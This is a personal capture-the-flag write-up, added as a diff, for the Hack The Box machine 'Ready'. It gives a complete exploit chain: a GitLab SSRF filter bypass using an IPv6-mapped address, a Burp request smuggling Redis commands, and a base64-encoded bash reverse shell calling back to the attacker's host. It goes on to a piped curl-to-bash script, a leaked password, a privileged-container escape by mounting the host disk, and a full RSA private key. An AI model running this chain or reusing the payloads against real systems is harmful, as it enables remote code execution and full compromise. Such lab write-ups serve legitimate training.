@@ -1,0 +1,654 @@
+Ready - Hack The Box - Linux - SSRF, Gopher, Redis
+
+Bypassing a filter that prevents ssrf from accessing ports on localhost by specifying ip address in a weird ipv6 way.
+
+Ports open: 22 and 5080
+
+Old gitlab instance from 2018, RCE
+
+There is an open registration, so we can register openly.
+We try to search for open projects but nothing, next thing to do is check the gitlab version
+
+http://10.10.10.220:5080/help
+
+Commands and Output:
+==================================================================================================================================
+GitLab Community Edition 11.4.7
+
+Nov 21, 2018 - Jan Provaznik    
+GitLab Patch Release: 11.4.7
+
+GitLab 11.4.7 patch release resolves one bug in 11.4.
+
+Today we are releasing version 11.4.7 for GitLab Community Edition and Enterprise Edition. This release only contains a fix for GitLab Enterprise Edition, GitLab Community Edition has no changes compared to 11.4.6.
+==================================================================================================================================
+
+We can search for gitlab gitlab to search for an rce.
+https://gitlab.com/gitlab-org/gitlab/-/commits/master?utf8=%E2%9C%93&search=merge+branch+%27security
+
+Eventualy we scroll down to November 2018 and a bunch of security issues related ssrf
+https://gitlab.com/gitlab-org/gitlab/-/commit/a9f5b22394954be8941566da1cf349bb6a179974
+
+There are a lot of exploit chains that make it dangerous, webhook of ipv6
+Commands and Output:
+==================================================================================================================================
+      def validate_localhost!(addrs_info)
+        local_ips = ["127.0.0.1", "::1", "0.0.0.0"]
+        local_ips = ["::", "0.0.0.0"]
+        local_ips.concat(Socket.ip_address_list.map(&:ip_address))
+==================================================================================================================================
+
+You can encode your ip in deifferent ways such as octal notation
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $ping 0177.1
+PING 0177.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.054 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.045 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.061 ms
+^C
+--- 0177.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3060ms
+rtt min/avg/max/mdev = 0.032/0.048/0.061/0.010 ms
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $ping 0x7f.1
+PING 0x7f.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.031 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.030 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.040 ms
+^C
+--- 0x7f.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3043ms
+rtt min/avg/max/mdev = 0.030/0.034/0.040/0.004 ms
+
+..
+..
+..
+==================================================================================================================================
+
+
+So the issue lies when we create a project, then in project url specify localhost 
+Import projecy, git repo by url, then speicfy http://127.0.0.1 with random project name
+Commands and Output:
+==================================================================================================================================
+
+The form contains the following error:
+
+    Import url is blocked: Requests to localhost are not allowed
+==================================================================================================================================
+
+We are blocked. If we go to ourselves, the server connects back to us and we get more info
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $sudo nc -lnvp 80
+[sudo] password for user: 
+listening on [any] 80 ...
+^[[D^[[D^[[Dconnect to [10.10.14.18] from (UNKNOWN) [10.10.10.220] 58268
+GET /test/info/refs?service=git-upload-pack HTTP/1.1
+Host: 10.10.14.18
+User-Agent: git/2.18.1
+Accept: */*
+Accept-Encoding: deflate, gzip
+Pragma: no-cache
+
+
+==================================================================================================================================
+
+THe vulnerability comes from the fact that the  developer does not want users to access ports on localhost, because those are not 
+exposed externally and there could be sensitive protocols listening on localhost for example redis which has commands that can get
+code execution.
+
+Main way to chain ssrf vulns into rce is through gopher. Minimal protocol which allows us to craft payloads, however this is blocked
+on the website so we have to use to git protocol through port 80.
+
+
+Commands and Output:
+==================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $sudo nc -lnvp 80
+listening on [any] 80 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.220] 59452
+0034git-upload-pack /test/test1host=10.10.14.18:80
+==================================================================================================================================
+
+We have a connect back. If we want to craft stuff we have to be able to send data, with goher we could intoduce "0d 0a" hex for line
+break. We will try this with the git by redoing the same steps as before.
+Ex.
+"git://10.10.14.18:80/test/test.git"
+
+We can now get a connection back to ouselves
+
+Commands and Output:
+==================================================================================================================================
+POST /projects HTTP/1.1
+Host: 10.10.10.220:5080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.220:5080/projects/new
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 377
+Origin: http://10.10.10.220:5080
+DNT: 1
+Connection: close
+Cookie: sidebar_collapsed=false; _gitlab_session=7b61cc3153c4e71c3ac4bebd6534587e; event_filter=all
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+utf8=%E2%9C%93&authenticity_token=WwzjVTWgfdrMih2X7NiyUN0s8dwDPmllOhhlIaFldcGElquuQD%2FIfWDDlQH1xZ8S27ucrrghzbQSkKGebI8Ixg%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F10.10.14.18%3A80%2Ftest%2Ftest.git
+Test
+Please
+&project%5Bci_cd_only%5D=false&project%5Bname%5D=test&project%5Bnamespace_id%5D=2&project%5Bpath%5D=test&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
+
+..
+..
+..
+
+┌─[✗]─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $sudo nc -lnvp 80
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 10.10.10.220.
+Ncat: Connection from 10.10.10.220:57504.
+0045git-upload-pack /test/test.git 
+Test 
+Pleasehost=10.10.14.18:80^C
+
+==================================================================================================================================
+
+
+We now look for ssrf rce's pertaining to git. If we can connect to a port on the gitlab server than we can send lines afterwards.
+Ipv6 works in importing the url
+git://[0:0:0:0:0:ffff:0.0.0.0]/foo/foo.git
+
+We also look at redis RCE to mimic the same results
+https://github.com/jas502n/gitlab-SSRF-redis-RCE
+
+Here we can copy both the ipv6 adddress and the POC exploit except we will change the payload and base64 encode and make sure that
+no "+" are used for the encoding since it messes with the way the exploit is read the webserver prior to being processed in the 
+commandline.
+Commands and Output:
+==================================================================================================================================
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git
+
+..
+..
+..
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|echo -n YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxJw== | base64 -d | bash  \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ exec
+ exec
+ exec
+==================================================================================================================================
+
+Once we intercept the request with burp, we can the modify the request with the POC payload, we have to make sure we properly
+specify the ipv6 address and the payload
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $echo -n "bash -c ' bash -i >& /dev/tcp/10.10.14.18/9001 0>&1'" | base64 
+YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxJw==
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $echo -n "YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxJw==" | base64 -d | bash
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $echo -n YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxJw== | base64 -d | bash
+==================================================================================================================================
+
+
+Burp Request for Redis Server
+Commands and Output:
+==================================================================================================================================
+POST /projects HTTP/1.1
+Host: 10.10.10.220:5080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.220:5080/projects/new
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 858
+Origin: http://10.10.10.220:5080
+DNT: 1
+Connection: close
+Cookie: sidebar_collapsed=false; _gitlab_session=7b61cc3153c4e71c3ac4bebd6534587e; event_filter=all
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+utf8=%E2%9C%93&authenticity_token=s6mzNudMM8ipruyTk93ohe%2FV%2Fnewnwg4fUQt1d26Vy9sM%2FvNktOGbwXnZAWKwMXH6UKTBQuArOlVzOlqEFAqKA%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ftest%2Fssrf.git
+ multi
+ sadd resque:gitlab:queues system_hook_push
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|echo -n YmFzaCAtYyAnIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTgvOTAwMSAwPiYxJw== | base64 -d | bash  \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+ exec
+ exec
+ exec
+&project%5Bci_cd_only%5D=false&project%5Bname%5D=testing123&project%5Bnamespace_id%5D=2&project%5Bpath%5D=ssrf&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
+==================================================================================================================================
+
+Reverse shell listener set and received
+Commands and Output:
+==================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ready]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.220.
+Ncat: Connection from 10.10.10.220:41892.
+bash: cannot set terminal process group (505): Inappropriate ioctl for device
+bash: no job control in this shell
+git@gitlab:~/gitlab-rails/working$ whoami
+whoami
+git
+==================================================================================================================================
+
+We can now look at the environment and we notice right away we are in a docker container if we go to the root directory and "ls -la"
+Commands and Output:
+==================================================================================================================================
+ls -la
+total 104
+drwxr-xr-x   1 root root 4096 Dec  1 12:41 .
+drwxr-xr-x   1 root root 4096 Dec  1 12:41 ..
+-rwxr-xr-x   1 root root    0 Dec  1 12:41 .dockerenv
+-rw-r--r--   1 root root  185 Nov 20  2018 RELEASE
+drwxr-xr-x   2 root root 4096 Nov 20  2018 assets
+drwxr-xr-x   1 root root 4096 Dec  1 15:40 bin
+drwxr-xr-x   2 root root 4096 Apr 12  2016 boot
+drwxr-xr-x  13 root root 3760 May 16 03:03 dev
+..
+..
+..
+==================================================================================================================================
+
+We see the docker env file, we can run deepce which is a dcoker script to check for vulnerabilities.
+Commands and Output:
+==================================================================================================================================
+wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
+==================================================================================================================================
+
+
+Commands and Output:
+==================================================================================================================================
+
+git@gitlab:/dev/shm$ curl 10.10.14.18/deepce.sh | bash
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 38195  100 38195    0     0   142k      0 --:--:-- --:--:-- --:--:--  141k
+
+                      ##         .
+                ## ## ##        ==
+             ## ## ## ##       ===
+         /"""""""""""""""""\___/ ===
+    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
+         \______ X           __/
+           \    \         __/
+            \____\_______/
+          __
+     ____/ /__  ___  ____  ________
+    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
+   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
+   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
+                 /_/
+
+ Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+ by stealthcopter
+
+==========================================( Colors )==========================================
+[+] Exploit Test ............ Exploitable - Check this out
+[+] Basic Test .............. Positive Result
+[+] Another Test ............ Error running check
+[+] Negative Test ........... No
+[+] Multi line test ......... Yes
+Command output
+spanning multiple lines
+
+Tips will look like this and often contains links with additional info. You can usually 
+ctrl+click links in modern terminal to open in a browser window
+See https://stealthcopter.github.io/deepce
+
+===================================( Enumerating Platform )===================================
+[+] Inside Container ........ Yes
+[+] Container Platform ...... docker
+[+] Container tools ......... None
+[+] User .................... git
+[+] Groups .................. git
+[+] Docker Executable ....... Not Found
+[+] Docker Sock ............. Not Found
+[+] Docker Version .......... Version Unknown
+==================================( Enumerating Container )===================================
+[+] Container ID ............ gitlab.example.com
+[+] Container Full ID ....... 7eb263389e5eea068ad3d0c208ea4dd02ba86fa0b2ebd44f63adc391351fba6d
+[+] Container Name .......... Could not get container name through reverse DNS
+[+] Container IP ............ 172.19.0.2 
+[+] DNS Server(s) ........... 127.0.0.11 
+[+] Host IP ................. 172.19.0.1
+[+] Operating System ........ GNU/Linux
+[+] Kernel .................. 5.4.0-40-generic
+[+] Arch .................... x86_64
+[+] CPU ..................... AMD EPYC 7401P 24-Core Processor
+[+] Useful tools installed .. Yes
+/opt/gitlab/embedded/bin/curl
+/usr/bin/wget
+/bin/nc
+/bin/netcat
+/bin/hostname
+/opt/gitlab/embedded/bin/python3
+[+] Dangerous Capabilities .. Unknown (capsh not installed)
+[+] SSHD Service ............ grep: write error: Broken pipe
+Yes (port Port 22)
+[+] Privileged Mode ......... Unknown
+====================================( Enumerating Mounts )====================================
+[+] Docker sock mounted ....... No
+[+] Other mounts .............. Yes
+/root/docker-gitlab/root_pass /root_pass rw,relatime - ext4 /dev/sda2 rw
+/root/docker-gitlab/srv/gitlab/config /etc/gitlab rw,relatime - ext4 /dev/sda2 rw
+/root/docker-gitlab/srv/gitlab/logs /var/log/gitlab rw,relatime - ext4 /dev/sda2 rw
+[+] Possible host usernames ...  
+====================================( Interesting Files )=====================================
+[+] Interesting environment variables ... No
+[+] Any common entrypoint files ......... No
+[+] Interesting files in root ........... Yes
+/root_pass
+/RELEASE
+[+] Passwords in common files ........... No
+[+] Home directories .................... total 4.0K
+drwxr-xr-x 2 dude dude 4.0K Dec  7 16:58 dude
+bash: line 804: /etc/shadow: Permission denied
+[+] Hashes in shadow file ............... No
+[+] Searching for app dirs .............. 
+==================================( Enumerating Containers )==================================
+By default containers can communicate with other containers on the same network and the 
+host machine, this can be used to enumerate further
+
+Could not ping sweep, requires nmap or ping to be executable
+==============================================================================================
+==================================================================================================================================
+
+There appears to be a file root_pass that is readable with what looks like a password. Will try linpeas.sh
+Commands and Output:
+==================================================================================================================================
+
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)
+sda
+sda1
+sda2
+sda3
+..
+..
+..
+==================================================================================================================================
+
+We find some sda drives we may be able to mount but need to get root on the container first.
+We find a backup directory in /opt let's examine it.
+Commands and Output:
+==================================================================================================================================
+docker-compose.yml  gitlab-secrets.json  gitlab.rb
+git@gitlab:/opt/backup$ cat docker-compose.yml 
+version: '2.4'
+
+services:
+  web:
+    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
+    restart: always
+    hostname: 'gitlab.example.com'
+    environment:
+      GITLAB_OMNIBUS_CONFIG: |
+        external_url 'http://172.19.0.2'
+        redis['bind']='127.0.0.1'
+        redis['port']=6379
+        gitlab_rails['initial_root_password']=File.read('/root_pass')
+    networks:
+      gitlab:
+        ipv4_address: 172.19.0.2
+    ports:
+      - '5080:80'
+      #- '127.0.0.1:5080:80'
+      #- '127.0.0.1:50443:443'
+      #- '127.0.0.1:5022:22'
+    volumes:
+      - './srv/gitlab/config:/etc/gitlab'
+      - './srv/gitlab/logs:/var/log/gitlab'
+      - './srv/gitlab/data:/var/opt/gitlab'
+      - './root_pass:/root_pass'
+    privileged: true
+    restart: unless-stopped
+    #mem_limit: 1024m
+
+networks:
+  gitlab:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.19.0.0/16
+==================================================================================================================================
+
+privilege. = true, which means that the host drives are available in docker
+The root password is set to "root_pass"
+
+We then take a look at the gitlab rb fail and make sure to grep out any comments and we find a password of sorts
+Commands and Output:
+==================================================================================================================================
+git@gitlab:/opt/backup$ cat gitlab.rb | grep -v '^\#' | grep .
+gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
+==================================================================================================================================
+
+We can now switch user and become root from there we can mount the external drives and get root.txt
+Commands and Output:
+==================================================================================================================================
+Device        Start      End  Sectors Size Type
+/dev/sda1      2048     4095     2048   1M BIOS boot
+/dev/sda2      4096 37746687 37742592  18G Linux filesystem
+/dev/sda3  37746688 41940991  4194304   2G Linux swap
+root@gitlab:~# mount /dev/sda1 /mnt
+mount: wrong fs type, bad option, bad superblock on /dev/sda1,
+       missing codepage or helper program, or other error
+
+       In some cases useful info is found in syslog - try
+       dmesg | tail or so.
+root@gitlab:~# mount /dev/sda2 /mnt
+root@gitlab:~# cd /mnt
+root@gitlab:/mnt# ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
+root@gitlab:/mnt# cd root/
+root@gitlab:/mnt/root# ls
+docker-gitlab  ready-channel  root.txt  snap
+==================================================================================================================================
+
+We can also ssh as root by stealing the private key and using it for our ssh session
+Commands and Output:
+==================================================================================================================================
+root@gitlab:/mnt/root/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q
+sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn
+6KkYjWv+9kj9shzPaN1tNQLc2Rg39pn1mteyvUi2pBfA4ItE05F58WpCgh9KNMlf
+YmlPwjeRaqARlkkCgFcHFGyVxd6Rh4ZHNFjABd8JIl+Yaq/pg7t4qPhsiFsMwntX
+TBKGe8T4lzyboBNHOh5yUAI3a3Dx3MdoY+qXS/qatKS2Qgh0Ram2LLFxib9hR49W
+rG87jLNt/6s06z+Mwf7d/oN8SmCiJx3xHgFzbwIDAQABAoIBACeFZC4uuSbtv011
+YqHm9TqSH5BcKPLoMO5YVA/dhmz7xErbzfYg9fJUxXaIWyCIGAMpXoPlJ90GbGof
+Ar6pDgw8+RtdFVwtB/BsSipN2PrU/2kcVApgsyfBtQNb0b85/5NRe9tizR/Axwkf
+iUxK3bQOTVwdYQ3LHR6US96iNj/KNru1E8WXcsii5F7JiNG8CNgQx3dzve3Jzw5+
+lg5bKkywJcG1r4CU/XV7CJH2SEUTmtoEp5LpiA2Bmx9A2ep4AwNr7bd2sBr6x4ab
+VYYvjQlf79/ANRXUUxMTJ6w4ov572Sp41gA9bmwI/Er2uLTVQ4OEbpLoXDUDC1Cu
+K4ku7QECgYEA5G3RqH9ptsouNmg2H5xGZbG5oSpyYhFVsDad2E4y1BIZSxMayMXL
+g7vSV+D/almaACHJgSIrBjY8ZhGMd+kbloPJLRKA9ob8rfxzUvPEWAW81vNqBBi2
+3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy
+n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8
+kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1
+KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff
+Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B
+MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab
+dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v
+DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa
+bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r
+ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv
+aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz
+vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd
+-----END RSA PRIVATE KEY-----
+
+..
+..
+..
+└──╼ $ssh -i id_rsa root@10.10.10.220
+The authenticity of host '10.10.10.220 (10.10.10.220)' can't be established.
+ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.220' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 16 May 2021 04:52:28 AM UTC
+
+  System load:                      0.33
+  Usage of /:                       66.1% of 17.59GB
+  Memory usage:                     85%
+  Swap usage:                       1%
+  Processes:                        351
+  Users logged in:                  0
+  IPv4 address for br-bcb73b090b3f: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.220
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:3408
+
+  => There are 22 zombie processes.
+
+ * Introducing self-healing high availability clusters in MicroK8s.
+   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.
+
+     https://microk8s.io/high-availability
+
+186 updates can be installed immediately.
+89 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Feb 11 14:28:18 2021
+root@ready:~# ifconfig
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
+
+Commands and Output:
+==================================================================================================================================
+==================================================================================================================================
